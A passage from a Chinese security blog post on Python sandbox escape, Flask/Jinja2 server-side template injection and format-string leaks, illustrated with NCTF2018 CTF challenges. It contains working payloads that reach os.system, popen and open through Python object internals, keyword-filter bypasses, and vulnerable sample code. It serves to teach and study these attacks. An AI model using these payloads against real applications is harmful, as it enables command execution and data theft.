56 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open                  128 1 &lt;class &#39;os._wrap_close&#39;&gt; open                         128 1 &lt;class &#39;os._wrap_close&#39;&gt; exec                         128 7 &lt;class &#39;os._wrap_close&#39;&gt; open                         128 7 &lt;class &#39;os._wrap_close&#39;&gt; exec                         128 11 &lt;class &#39;os._wrap_close&#39;&gt; open                        129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; open                  129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; exec                  130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; open                 130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; exec                 137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; open            137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; exec            138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; open                138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; exec                139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; open                139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; exec                140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; open                140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; exec                167 7 &lt;class &#39;reprlib.Repr&#39;&gt; open                           167 7 &lt;class &#39;reprlib.Repr&#39;&gt; exec                           174 7 &lt;class &#39;functools.partialmethod&#39;&gt; open                174 7 &lt;class &#39;functools.partialmethod&#39;&gt; exec                176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; open176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; exec177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; open              177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; exec              ----------4-----------                                      140 open                                                    140 exec                                                    </code></pre><p>既然筛选出来，那么选其中一个利用来读取文件：</p><pre><code>&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[103]&lt;class &#39;codecs.IncrementalEncoder&#39;&gt;</code></pre><p>完整执行</p><pre><code>&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[103].__init__.__globals__[&#39;open&#39;](&quot;C:\\windows\\win.ini&quot;).read()&#39;; for 16-bit app support\n[fonts]\n[extensions]\n[mci extensions]\n[files]\n[Mail]\nMAPI=1\nCMCDLLNAME32=mapi32.dll\nCMC=1\nMAPIX=1\nMAPIXVER=1.0.0.1\nOLEMessaging=1\n[xianshuabao]\nclient_uuid={xxx}\n&#39;</code></pre><p>执行命令，此处如果使用原作者给的第三种利用代码在python3中会报错，python3中对于<code>dict.values</code>不再返回列表，而是返回view，不可索引的对象。</p><pre><code>&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[103].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;)misaki\user</code></pre><h3 id="python2"><a href="#python2" class="headerlink" title="python2"></a>python2</h3><p>python2.7的模块(252)</p><pre><code>bsddbcompilerctypescurses......webbrowser.pywhichdb.pywsgiref.egg-infoxdrlib.pyxmllib.pyxmlrpclib.pyzipfile.py</code></pre><p>同样利用原代码进行筛选</p><pre><code>----------1-----------(40, &#39;file&#39;)----------2-----------(59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;linecache&#39;, [&#39;os&#39;, &#39;sys&#39;, &#39;__builtins__&#39;])(59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;__builtins__&#39;, None)(59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;sys&#39;, None)(59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;types&#39;, [&#39;__builtins__&#39;])(60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;linecache&#39;, [&#39;os&#39;, &#39;sys&#39;, &#39;__builtins__&#39;])(60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;__builtins__&#39;, None)(60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;sys&#39;, None)(60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;types&#39;, [&#39;__builtins__&#39;])(61, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;__builtins__&#39;, None)(62, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;__builtins__&#39;, None)(72, &lt;class &#39;site._Printer&#39;&gt;, &#39;__builtins__&#39;, None)(72, &lt;class &#39;site._Printer&#39;&gt;, &#39;traceback&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;])(72, &lt;class &#39;site._Printer&#39;&gt;, &#39;os&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;, &#39;open&#39;])(72, &lt;class &#39;site._Printer&#39;&gt;, &#39;sys&#39;, None)(77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;__builtins__&#39;, None)(77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;traceback&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;])(77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;os&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;, &#39;open&#39;])(77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;sys&#39;, None)(78, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;__builtins__&#39;, None)(78, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;sys&#39;, None)(78, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;, None)(79, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;__builtins__&#39;, None)(79, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;sys&#39;, None)(79, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;, None)----------3-----------(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;__import__&#39;)(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;file&#39;)(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;compile&#39;)(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;eval&#39;)(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;open&#39;)(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;execfile&#39;)(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;__import__&#39;)(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;file&#39;)(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;compile&#39;)(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;eval&#39;)(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;open&#39;)(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;execfile&#39;)(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;__import__&#39;)(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;file&#39;)(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;compile&#39;)(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;eval&#39;)(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;open&#39;)(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;execfile&#39;)(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;__import__&#39;)(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;file&#39;)(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;compile&#39;)(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;eval&#39;)(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;open&#39;)(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;execfile&#39;)(72, 20, &lt;class &#39;site._Printer&#39;&gt;, &#39;file&#39;)(72, 20, &lt;class &#39;site._Printer&#39;&gt;, &#39;exec&#39;)(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;__import__&#39;)(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;file&#39;)(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;compile&#39;)(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;eval&#39;)(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;open&#39;)(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;execfile&#39;)(77, 20, &lt;class &#39;site.Quitter&#39;&gt;, &#39;file&#39;)(77, 20, &lt;class &#39;site.Quitter&#39;&gt;, &#39;exec&#39;)(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;__import__&#39;)(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;file&#39;)(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;compile&#39;)(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;eval&#39;)(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;open&#39;)(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;execfile&#39;)(78, 21, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;)(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;__import__&#39;)(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;file&#39;)(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;compile&#39;)(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;eval&#39;)(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;)(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;execfile&#39;)(79, 21, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;)(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;__import__&#39;)(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;file&#39;)(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;compile&#39;)(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;eval&#39;)(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;)(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;execfile&#39;)----------4-----------(60, &#39;__import__&#39;)(60, &#39;file&#39;)(60, &#39;repr&#39;)(60, &#39;compile&#39;)(60, &#39;eval&#39;)(60, &#39;open&#39;)(60, &#39;execfile&#39;)</code></pre><p>进一步获取可以直接执行命令或者读取文件的类</p><pre><code>----------1-----------                                                                (40, &#39;file&#39;)                                                                          ----------2-----------                                                                (59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;linecache&#39;, [&#39;os&#39;, &#39;sys&#39;, &#39;__builtins__&#39;])   (59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;types&#39;, [&#39;__builtins__&#39;])                    (60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;linecache&#39;, [&#39;os&#39;, &#39;sys&#39;, &#39;__builtins__&#39;])   (60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;types&#39;, [&#39;__builtins__&#39;])                    (72, &lt;class &#39;site._Printer&#39;&gt;, &#39;traceback&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;])                   (72, &lt;class &#39;site._Printer&#39;&gt;, &#39;os&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;, &#39;open&#39;])                  (77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;traceback&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;])                    (77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;os&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;, &#39;open&#39;])                   (78, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;, None)                               (79, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;, None)                               ----------3-----------                                                                (59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;file&#39;)                                   (59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;eval&#39;)                                   (59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;open&#39;)                                   (59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;execfile&#39;)                               (60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;file&#39;)                                   (60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;eval&#39;)                                   (60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;open&#39;)                                   (60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;execfile&#39;)                               (61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;file&#39;)                                (61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;eval&#39;)                                (61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;open&#39;)                                (61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;execfile&#39;)                            (62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;file&#39;)                                        (62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;eval&#39;)                                        (62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;open&#39;)                                        (62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;execfile&#39;)                                    (72, 20, &lt;class &#39;site._Printer&#39;&gt;, &#39;file&#39;)                                             (72, 20, &lt;class &#39;site._Printer&#39;&gt;, &#39;exec&#39;)                                             (72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;file&#39;)                                             (72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;eval&#39;)                                             (72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;open&#39;)                                             (72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;execfile&#39;)                                         (77, 20, &lt;class &#39;site.Quitter&#39;&gt;, &#39;file&#39;)                                              (77, 20, &lt;class &#39;site.Quitter&#39;&gt;, &#39;exec&#39;)                                              (77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;file&#39;)                                              (77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;eval&#39;)                                              (77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;open&#39;)                                              (77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;execfile&#39;)                                          (78, 21, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;)                                 (78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;file&#39;)                                 (78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;eval&#39;)                                 (78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;)                                 (78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;execfile&#39;)                             (79, 21, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;)                                 (79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;file&#39;)                                 (79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;eval&#39;)                                 (79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;)                                 (79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;execfile&#39;)                             ----------4-----------                                                                (60, &#39;file&#39;)                                                                          (60, &#39;repr&#39;)                                                                          (60, &#39;eval&#39;)                                                                          (60, &#39;open&#39;)                                                                          (60, &#39;execfile&#39;)                                                                      </code></pre><p>选取其中一个执行命令，<code>__mro__</code>输出父类，最后一个父类为object</p><pre><code>&gt;&gt;&gt; ().__class__.__mro__[-1].__subclasses__()[72]&lt;class &#39;site._Printer&#39;&gt;&gt;&gt;&gt; ().__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__[&#39;os&#39;].system(&#39;whoami&#39;)misaki\user</code></pre><p>读取文件</p><pre><code>&gt;&gt;&gt; ().__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&quot;C:\\windows\\win.ini&quot;).read()&#39;; for 16-bit app support\n[fonts]\n[extensions]\n[mciextensions]\n[files]\n[Mail]\nMAPI=1\nCMCDLLNAME32=mapi32.dll\nCMC=1\nMAPIX=1\nMAPIXVER=1.0.0.1\nOLEMessagin</code></pre><p>其中还可以执行的模块还有很多，比如使用含有<code>__builtins__</code>的其他模块，来调用加载的os等。</p><p>筛选代码来源：<a href="https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/#%E9%81%8D%E5%8E%86%E6%89%BE%E5%88%B0%E5%85%B6%E4%BB%96%E7%9A%84%E9%80%83%E9%80%B8%E6%96%B9%E6%B3%95" target="_blank" rel="noopener">Python沙箱逃逸总结</a></p><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>服务器端模板注入。既然谈到SSTI，在python中就要提一下flask，jinja2模板。此处利用网上一段代码</p><pre><code>from flask import Flaskfrom flask import request, render_template_string, render_templateapp = Flask(__name__)@app.route(&#39;/login&#39;)def hello_ssti():    person = {        &#39;name&#39;: &#39;hello&#39;,        &#39;secret&#39;: &#39;This_is_my_secret&#39;    }    if request.args.get(&#39;name&#39;):        person[&#39;name&#39;] = request.args.get(&#39;name&#39;)    template = &#39;&lt;h2&gt;Hello %s!&lt;/h2&gt;&#39; % person[&#39;name&#39;]    return render_template_string(template, person=person)if __name__ == &quot;__main__&quot;:    app.run(debug=True)</code></pre><p>当如下请求的时候就会显示其他参数，比如secret</p><pre><code>http://127.0.0.1:5000/login?name={{person[%27secret%27]}}</code></pre><p>其中的<code>render_template_string</code>和另一个模板函数<code>render_template</code>区别在第一个参数是否可以传入字符串，但是传入字符串就一定会有问题吗？修改template参数</p><pre><code>from flask import Flaskfrom flask import request, render_template_stringapp = Flask(__name__)@app.route(&#39;/login&#39;)def hello_ssti():    person = {        &#39;name&#39;: &#39;hello&#39;,        &#39;secret&#39;: &#39;This_is_my_secret&#39;    }    if request.args.get(&#39;name&#39;):        person[&#39;name&#39;] = request.args.get(&#39;name&#39;)    template = &#39;&lt;h2&gt;Hello {{person.name }}!&lt;/h2&gt;&#39;    return render_template_string(template, person=person)if __name__ == &quot;__main__&quot;:    app.run(debug=True)</code></pre><p>做如下请求的时候，就会显示<code>Hello {{person['secret']}}!</code>，我们传入的参数被当作字符串显示出来。</p><pre><code>http://127.0.0.1:5000/login?name={{person[%27secret%27]}}</code></pre><p>name参数传入后，先修改person中的name值，person变成</p><pre><code>person = {        &#39;name&#39;: &#39;{{person['secret']}}&#39;,        &#39;secret&#39;: &#39;This_is_my_secret&#39;    }</code></pre><p>后面调用模板，来执行的时候，根据变量取值，又把<code>person.name</code>获取出来，传入<code>render_template_string</code>的就是<code>&#39;&lt;h2&gt;Hello {{person.name}}!&lt;/h2&gt;&#39;</code>，取值后整体被当作字符串显示。这里跟上面格式化字符串的时候不一样的地方就出来了，当我们直接传入<code>{{person['secret']}}</code>的时候，调用模板变量取值的时候，先格式化字符串，把传入字符串当作变量来处理。也就是<code>&#39;&lt;h2&gt;Hello {{person['secret']}}!&lt;/h2&gt;&#39;</code>加载到<code>render_template_string</code>。这又涉及到python的字符串格式化。</p><h3 id="字符串格式化"><a href="#字符串格式化" class="headerlink" title="字符串格式化"></a>字符串格式化</h3><p>在python中常见的字符串格式化有几种形式</p><h4 id="操作符"><a href="#操作符" class="headerlink" title="%操作符"></a>%操作符</h4><pre><code>&gt;&gt;&gt; name = &quot;aaa&quot;&gt;&gt;&gt; &#39;%s&#39; %name&#39;aaa&#39;</code></pre><h4 id="string-Template"><a href="#string-Template" class="headerlink" title="string.Template"></a>string.Template</h4><pre><code>&gt;&gt;&gt; from string import Template&gt;&gt;&gt; name = &#39;aaa&#39;&gt;&gt;&gt; tem = Template(&#39;$name&#39;)&gt;&gt;&gt; tem.substitute(name=name)&#39;aaa&#39;</code></pre><h4 id="format"><a href="#format" class="headerlink" title="format"></a>format</h4><p>python2.6后引用的格式化字符串的函数</p><pre><code>&gt;&gt;&gt; name = &#39;aaa&#39;&gt;&gt;&gt; &#39;{}&#39;.format(name)&#39;aaa&#39;</code></pre><h4 id="f-Strings"><a href="#f-Strings" class="headerlink" title="f-Strings"></a>f-Strings</h4><p>python3.6后新增的字符串格式化方式，可以执行其中的python语句。</p><pre><code>&gt;&gt;&gt; name = &#39;aaa&#39;&gt;&gt;&gt; f&#39;{name}&#39;&#39;aaa&#39;&gt;&gt;&gt; f&#39;{name.upper()}&#39;&#39;AAA&#39;</code></pre><p>如何利用字符串格式化来读取敏感文件</p><pre><code>def view(request, *args, **kwargs):    template = &#39;Hello {user}, This is your email: &#39; + request.GET.get(&#39;email&#39;)    return HttpResponse(template.format(user=request.user))</code></pre><p>如果控制了email参数就是控制了字符串格式化一部分，当传入<code>{user.password}</code>的时候就会显示用户的哈希密码。<code>user</code>是当前上下文中仅有的一个变量，也就是format函数传入的<code>user=request.user</code>，Django中<code>request.user</code>是当前用户对象，这个对象包含一个属性<code>password</code>，也就是该用户的密码。所以，<code>{user.password}</code>实际上就是输出了<code>request.user.password</code>。</p><p>以上代码：<a href="https://xz.aliyun.com/t/288" target="_blank" rel="noopener">Python格式化字符串漏洞</a>，<a href="https://mp.weixin.qq.com/s/Lj4nCz0hag-AKQF_s79fQw" target="_blank" rel="noopener">一文掌握CTF中Python全部考点</a></p><h3 id="CTF-利用"><a href="#CTF-利用" class="headerlink" title="CTF 利用"></a>CTF 利用</h3><p>下面用几个CTF题来感受一下。</p><h4 id="flask-真香"><a href="#flask-真香" class="headerlink" title="flask 真香"></a>flask 真香</h4><p><a href="https://github.com/NJUPT-coding-gay/NCTF2018/tree/master/Web/flask真香" target="_blank" rel="noopener">https://github.com/NJUPT-coding-gay/NCTF2018/tree/master/Web/flask%E7%9C%9F%E9%A6%99</a></p><p>不过这个环境现在搭建会有点问题，flask会使用的是最新1.1.2版本，显示的request.url会先url编码再显示到页面上，需要更改flask版本。</p><p>修改Dockerfile文件:</p><pre><code>RUN pip3 install flask==0.12.1RUN pip3 install MarkupSafe==1.0RUN pip3 install jinja2==2.9 RUN pip3 install Werkzeug==0.14.1</code></pre><p>启动后就能愉快的看到页面了</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150449.png" alt="image-20200422144323164"></p><p>禁用了不少关键词，然后使用的session对象来解决，就直接利用上手</p><p>在查找子父类的函数上，<code>__mro__</code>被禁用了，但是<code>__bases__</code>并没有。先找到object类</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150452.png" alt="image-20200422153648190"></p><p>然后再去获取子类，由于class被禁用，<code>__subclasses__</code>不能直接使用。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150453.png" alt="image-20200422160624948"></p><p>其中可以利用的有open和popen，open在<code>__builtins__</code>里面</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150455.png" alt="image-20200422170120593"></p><p>执行命令查找文件</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150458.png" alt="image-20200422170817564"></p><p>读取文件即可</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150500.png" alt="image-20200422170906003"></p><p>使用open，但是需要知道文件位置</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150502.png" alt="image-20200422171331227"></p><p>如果不想用session，或者session也不能用了，就需要更多的绕过方式，下面会提到这种。</p><pre><code>{{(((()|attr(("_"*2,"cla","ss","_"*2)|join)|attr(("_"*2,"bases","_"*2)|join))[0]|attr(("_"*2,"subcla","sses","_"*2)|join)())[102]|attr(("_"*2,"init","_"*2)|join)|attr(("_"*2,"globals","_"*2)|join)).get('pop'+'en')('cat%20/Th1s__is_S3cret').read()}}</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150506.png" alt="image-20200423171734174"></p><h4 id="flask-plus"><a href="#flask-plus" class="headerlink" title="flask plus"></a>flask plus</h4><p><a href="https://github.com/NJUPT-coding-gay/NCTF2018/tree/master/Web/Flask PLUS" target="_blank" rel="noopener">https://github.com/NJUPT-coding-gay/NCTF2018/tree/master/Web/Flask%20PLUS</a></p><p>同样的页面，说明应该是增加了过滤的东西，同样修改Dockerfile文件。</p><p>使用上一个POC，发现<code>__init__</code>被过滤了。至少到这一步是正常的</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150508.png" alt="image-20200423102101580"></p><p>然后只需要把<code>__init__</code>做拼接就行了</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150510.png" alt="image-20200423102442838"></p><p>如果某种情况下不能拼接，或者不想去这么做，也可以去查是否有替代属性。要求能替代<code>__init__</code>，要有<code>__globals__</code>属性。也就是重载过<code>__init__</code></p><pre><code>import osfor i in dir(os._wrap_close):    if &#39;__globals__&#39; in dir(eval(&#39;os._wrap_close.&#39;+i)):        print(i)</code></pre><p>大概符合标准的有</p><pre><code>__enter__   __exit__    __getattr__ __init__    __iter__    close       </code></pre><p>使用<code>__enter__</code></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150512.png" alt="image-20200423104717984"></p><p>使用<code>__getattr__</code>，不过这个被禁用了。需要拼接，这就跟上面<code>__init__</code>类似了。更换<code>__iter__</code></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150514.png" alt="image-20200423104853471"></p><p><code>close</code>也被禁用了。<code>__exit__</code>还可以使用</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150516.png" alt="image-20200423105018271"></p><h4 id="flask-改"><a href="#flask-改" class="headerlink" title="flask 改"></a>flask 改</h4><p>如果在过滤中只过滤了特殊符号，比如<code>__</code>这种，代码</p><pre><code>#!/usr/bin/env python# -*- coding: utf-8 -*-from flask import Flask,render_template,render_template_string,redirect,request,session,abort,send_from_directoryimport osapp = Flask(__name__)@app.route(&quot;/&quot;)def index():    &quot;主页&quot;    return render_template(&quot;index2.html&quot;)@app.route(&#39;/user&#39;)def user():    def safe_jinja(s):        blacklist = [&#39;__class__&#39;,&#39;__init__&#39;,&#39;__&#39;]        flag = True        for no in blacklist:            if no.lower() in s.lower():               flag= False               break        return flag    template = &#39;&#39;&#39;{%% block body %%}    &lt;div class=&quot;center-content error&quot;&gt;        &lt;h3&gt;%s&lt;/h3&gt;    &lt;/div&gt; {%% endblock %%}&#39;&#39;&#39; % (request.url)    if safe_jinja(request.args.get(&#39;name&#39;)):        return render_template_string(template)    else:        return render_template_string(&quot;&lt;h2&gt;NO!&lt;/h2&gt;&quot;)if __name__ == &quot;__main__&quot;:    app.run(host=&#39;0.0.0.0&#39;,port=5000)</code></pre><p>如果是上面这种对参数过滤的形式，<code>request.args.param</code>来获取新参数的值</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150519.png" alt="image-20200423143634582"></p><p>如果是把<code>[]</code>也过滤掉，就需要用jinja2模板函数来处理，比如<code>attr()</code></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150521.png" alt="image-20200423144945343"></p><p>构造请求</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150523.png" alt="image-20200423143742243"></p><p>现在可以看到上面过滤掉了<code>__class__</code>，这种也可以采用</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150526.png" alt="image-20200423144033662"></p><p>如何利用这种过滤来获取flag，其中由于中括号被禁用，利用列表的pop方法。但是元组没有pop方法，所以需要先转换成list，再去调用，字典可以使用get()获取键值。原flag文件名带双下划线改成单下划线了。如果其中的某个字符串关键词，比如<code>class</code>被禁用，直接拼接来绕过就行。</p><pre><code>{{(((request|attr(("_"*2,"class","_"*2)|join)|attr(("_"*2,"mro","_"*2)|join)|list).pop(-1)|attr(("_"*2,"subclasses","_"*2)|join)()).pop(258)|attr(("_"*2,"init","_"*2)|join)|attr(("_"*2,"globals","_"*2)|join)).get(("_"*2,"builtins","_"*2)|join).get('open')('Th1s_is_F1114g').read()}}</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150528.png" alt="image-20200423155904496"></p><p>原代码中是过滤掉<code>join</code>的，所以这里也可以使用<code>format</code>来处理</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150530.png" alt="image-20200423145253095"></p><p>完整的利用就是</p><pre><code>{{(((request|attr(request.args.f|format(request.args.a))|attr(request.args.f|format(request.args.b))|list).pop(-1)|attr(request.args.f|format(request.args.c))()).pop(118)|attr(request.args.f|format(request.args.d))|attr(request.args.f|format(request.args.e))).get('popen')('cat%20Th1s_is_F1114g').read()}}&amp;f=%s&amp;a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=__init__&amp;e=__globals__</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150532.png" 